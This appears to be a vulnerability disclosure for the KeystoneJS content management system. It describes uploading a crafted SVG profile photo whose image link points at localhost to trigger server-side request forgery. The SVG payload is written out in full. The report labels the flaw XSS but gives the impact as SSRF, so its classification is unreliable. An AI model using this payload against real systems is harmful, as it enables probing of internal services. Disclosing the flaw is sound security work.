# :book: Description


 `KeystoneJS` is a powerful Node.js content management system and web app framework built on the Express web framework and Mongoose ODM. Keystone makes it easy to create sophisticated web sites and apps, and comes with a beautiful auto-generated Admin UI. This package is vulnerable for `(XSS)`.

https://github.com/keystonejs/keystone-classic

# :recycle:  Steps To Reproduce-:  
  0) download and run latest release from https://github.com/keystonejs/keystone-classic use demo http://demo.keystonejs.com/
  1) upload svg file as user profile photo. Payload used :
```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position:relative" width="300" height="200" overflow="hidden">
<image x="10" y="10" width="276" height="110" xlink:href="http://localhost:8080/svg"/>
<path d="M0 150h300v10H0z"/>
</svg>
```
# :telescope: POC

https://drive.google.com/file/d/1Rqsbr9_ijoHOa949B9Q1cM2jv8jb4zwV/view?usp=sharing
## 💥 Impact
SSRF
